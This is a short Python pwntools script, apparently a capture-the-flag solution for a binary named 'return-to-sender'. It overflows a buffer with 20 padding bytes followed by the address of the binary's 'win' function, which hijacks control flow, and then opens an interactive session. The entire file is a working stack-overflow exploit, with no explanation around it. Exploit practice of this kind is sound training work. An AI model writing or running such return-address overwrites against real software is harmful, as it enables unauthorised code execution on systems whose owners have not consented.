from pwn import *

e = ELF('./return-to-sender')
p = process('./return-to-sender')

win_addr = e.symbols['win']

payload = 'A'*20
payload += p32(win_addr)

print p.recvuntil('Where are you sending your mail to today? ')
p.sendline(payload)
p.interactive() 
print p.recv()